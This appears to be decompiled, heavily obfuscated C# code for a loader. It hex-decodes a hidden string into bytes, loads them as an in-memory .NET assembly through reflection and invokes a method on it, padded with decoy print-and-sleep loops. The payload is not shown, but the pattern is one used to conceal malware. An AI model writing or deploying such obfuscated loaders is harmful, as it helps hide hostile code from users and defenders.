using System;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;
using E9WqClkF5flts6jpmr;

namespace htguQ3iMQYGKhw58EiU;

internal sealed class Oa0njJigAMqFCLQG65Q
{
	public static Assembly acKiw98XNh;

	private static Func<char, bool> CYjiX45lID;

	private static Oa0njJigAMqFCLQG65Q gOmFhEPR7uYAdKgnUSg;

	private static void spmiTr3Htk()
	{
		sGGi78ZGvR();
		fdvi2VxxrD();
	}

	private static byte[] EBXiF9NtIj()
	{
		string text = (string)RE8gRCPM2jxGBNIQMWb(-1085699871);
		string source = text;
		if (CYjiX45lID == null)
		{
			CYjiX45lID = FA4ij3dIEs;
		}
		text = string.Concat(source.Where(CYjiX45lID));
		int num = 3;
		if (uNkIGnP5V8eWERX5efR() != null)
		{
			goto IL_005c;
		}
		goto IL_0060;
		IL_005c:
		int num2 = default(int);
		num = num2;
		goto IL_0060;
		IL_0060:
		byte[] array = default(byte[]);
		int length = default(int);
		int num3 = default(int);
		do
		{
			switch (num)
			{
			case 3:
				goto IL_0046;
			case 1:
				array = new byte[length / 2];
				num3 = 0;
				goto case 6;
			case 6:
				if (num3 >= length)
				{
					break;
				}
				num2 = 4;
				goto default;
			case 5:
				num3 += 2;
				goto case 6;
			default:
				array[num3 / 2] = Convert.ToByte(text.Substring(num3, 2), 16);
				goto case 5;
			case 2:
				break;
			}
			return array;
			IL_0046:
			length = text.Length;
			num = 1;
		}
		while (uNkIGnP5V8eWERX5efR() == null);
		goto IL_005c;
	}

	private static void sGGi78ZGvR()
	{
		int num = 8;
		int num5 = default(int);
		int num6 = default(int);
		while (true)
		{
			int num2 = 5;
			while (true)
			{
				int[] array = new int[10];
				while (true)
				{
					int num3 = 0;
					while (true)
					{
						int num4;
						if (num3 >= 10)
						{
							num4 = 1;
							if (uNkIGnP5V8eWERX5efR() != null)
							{
								goto IL_005d;
							}
							goto IL_0079;
						}
						goto IL_00b8;
						IL_005d:
						num4 = num;
						goto IL_0079;
						IL_00b8:
						array[num3] = num3 + 100;
						num4 = 11;
						if (!jpXqTgPyFTlP00N1QCZ())
						{
							goto IL_005d;
						}
						goto IL_0079;
						IL_0079:
						while (true)
						{
							switch (num4)
							{
							case 5:
								gTjBEwP9kT7BAppVHY3(SkkFt8Pwx6X06cFEbh.YvvCdqE7y(-1086238489), num5, array[num5]);
								goto case 12;
							case 12:
								num5++;
								goto case 13;
							case 13:
								if (num5 < 10)
								{
									goto case 5;
								}
								goto case 10;
							case 10:
								num6 = 0;
								goto case 3;
							case 3:
							case 4:
								if (num6 >= num2)
								{
									return;
								}
								goto default;
							default:
								vRD1L5Pdob0I85cOJ54(1000);
								num4 = 6;
								if (uNkIGnP5V8eWERX5efR() == null)
								{
									continue;
								}
								goto IL_005d;
							case 6:
								num6++;
								num = 3;
								goto case 3;
							case 1:
								num5 = 0;
								goto case 13;
							case 2:
								break;
							case 11:
								goto IL_00d1;
							case 9:
								goto end_IL_00eb;
							case 7:
								goto end_IL_00f3;
							case 8:
								goto end_IL_00f8;
							}
							break;
						}
						goto IL_00b8;
						IL_00d1:
						num3++;
						continue;
						end_IL_00eb:
						break;
					}
					continue;
					end_IL_00f3:
					break;
				}
				continue;
				end_IL_00f8:
				break;
			}
		}
	}

	private static void fdvi2VxxrD()
	{
		int num = 2;
		Type type = default(Type);
		int num4 = default(int);
		int num3 = default(int);
		object object_ = default(object);
		while (true)
		{
			acKiw98XNh = (Assembly)typeof(Assembly).InvokeMember(SkkFt8Pwx6X06cFEbh.YvvCdqE7y(-1086238514), BindingFlags.InvokeMethod, null, null, new object[1] { EBXiF9NtIj() });
			int num2 = 1;
			if (uNkIGnP5V8eWERX5efR() != null)
			{
				goto IL_0070;
			}
			goto IL_0074;
			IL_0074:
			while (true)
			{
				switch (num2)
				{
				case 7:
					pZUBpEPi9IX8jIDXShb(type.FullName);
					num2 = 0;
					if (uNkIGnP5V8eWERX5efR() == null)
					{
						continue;
					}
					goto default;
				default:
					if (num4 == num3)
					{
						goto case 7;
					}
					goto case 6;
				case 6:
					object_ = mwkvMjPUFc8tphU0g8l();
					num2 = 5;
					if (uNkIGnP5V8eWERX5efR() != null)
					{
						continue;
					}
					goto case 5;
				case 4:
					num3 = 0;
					num4 = 1;
					goto default;
				case 1:
					break;
				case 2:
					goto end_IL_0074;
				case 5:
					xhmrTBP4MoJxq9Wsf2Q(type, object_);
					return;
				}
				type = acKiw98XNh.GetType(SkkFt8Pwx6X06cFEbh.YvvCdqE7y(-1086238533));
				num2 = 4;
				if (uNkIGnP5V8eWERX5efR() == null)
				{
					continue;
				}
				goto IL_0070;
				continue;
				end_IL_0074:
				break;
			}
			continue;
			IL_0070:
			num2 = num;
			goto IL_0074;
		}
	}

	private static object Ji4inZml4j()
	{
		PFTlqqPNZxViQsw6fRo(new int[5], (RuntimeFieldHandle)/*OpCode not supported: LdMemberToken*/);
		return acKiw98XNh.CreateInstance((string)RE8gRCPM2jxGBNIQMWb(-1086238533));
	}

	private static object FvkiQPAbnq(Type type_0, object object_0)
	{
		int[] array = new int[10];
		int num = 0;
		int num3 = default(int);
		int[] array2 = default(int[]);
		int num4 = default(int);
		int num5 = default(int);
		int num6 = default(int);
		while (true)
		{
			IL_00d7:
			int num2;
			if (num < 10)
			{
				num2 = 1;
				if (uNkIGnP5V8eWERX5efR() != null)
				{
					goto IL_003b;
				}
				goto IL_003f;
			}
			goto IL_00aa;
			IL_003b:
			num2 = num3;
			goto IL_003f;
			IL_00aa:
			array2 = array;
			goto IL_00a5;
			IL_00a5:
			num4 = 0;
			goto IL_009b;
			IL_009b:
			if (num4 >= array2.Length)
			{
				break;
			}
			goto IL_008c;
			IL_008c:
			num5 = array2[num4];
			goto IL_0076;
			IL_0076:
			num6 = num5 - 100;
			num2 = 6;
			if (uNkIGnP5V8eWERX5efR() != null)
			{
				goto IL_003b;
			}
			goto IL_003f;
			IL_003f:
			while (true)
			{
				switch (num2)
				{
				case 6:
					break;
				case 4:
					goto end_IL_003f;
				case 2:
				case 9:
					goto IL_008c;
				default:
					num4++;
					goto IL_009b;
				case 11:
					goto IL_009b;
				case 7:
					goto IL_00a5;
				case 10:
					goto IL_00aa;
				case 1:
					array[num] = num + 100;
					goto case 5;
				case 5:
					num++;
					goto IL_00d7;
				case 3:
					goto IL_00d7;
				case 8:
					goto end_IL_00d7;
				}
				gTjBEwP9kT7BAppVHY3(SkkFt8Pwx6X06cFEbh.YvvCdqE7y(-1086238489), num6, num5);
				num2 = 0;
				if (uNkIGnP5V8eWERX5efR() == null)
				{
					continue;
				}
				goto IL_003b;
				continue;
				end_IL_003f:
				break;
			}
			goto IL_0076;
			continue;
			end_IL_00d7:
			break;
		}
		return type_0.InvokeMember(SkkFt8Pwx6X06cFEbh.YvvCdqE7y(-1086238569), BindingFlags.Instance | BindingFlags.Public | BindingFlags.InvokeMethod, null, object_0, null);
	}

	private static bool FA4ij3dIEs(char char_0)
	{
		return !I620QBPVUkxtpxlSTR6(char_0);
	}

	internal static object RE8gRCPM2jxGBNIQMWb(int int_0)
	{
		return SkkFt8Pwx6X06cFEbh.YvvCdqE7y(int_0);
	}

	internal static bool jpXqTgPyFTlP00N1QCZ()
	{
		return gOmFhEPR7uYAdKgnUSg == null;
	}

	internal static Oa0njJigAMqFCLQG65Q uNkIGnP5V8eWERX5efR()
	{
		return gOmFhEPR7uYAdKgnUSg;
	}

	internal static void gTjBEwP9kT7BAppVHY3(object object_0, object object_1, object object_2)
	{
		Console.WriteLine((string)object_0, object_1, object_2);
	}

	internal static void vRD1L5Pdob0I85cOJ54(int int_0)
	{
		Thread.Sleep(int_0);
	}

	internal static void pZUBpEPi9IX8jIDXShb(object object_0)
	{
		Console.WriteLine((string?)object_0);
	}

	internal static object mwkvMjPUFc8tphU0g8l()
	{
		return Ji4inZml4j();
	}

	internal static object xhmrTBP4MoJxq9Wsf2Q(Type type_0, object object_0)
	{
		return FvkiQPAbnq(type_0, object_0);
	}

	internal static void PFTlqqPNZxViQsw6fRo(object object_0, RuntimeFieldHandle runtimeFieldHandle_0)
	{
		RuntimeHelpers.InitializeArray((Array)object_0, runtimeFieldHandle_0);
	}

	internal static bool I620QBPVUkxtpxlSTR6(char char_0)
	{
		return char.IsWhiteSpace(char_0);
	}
}
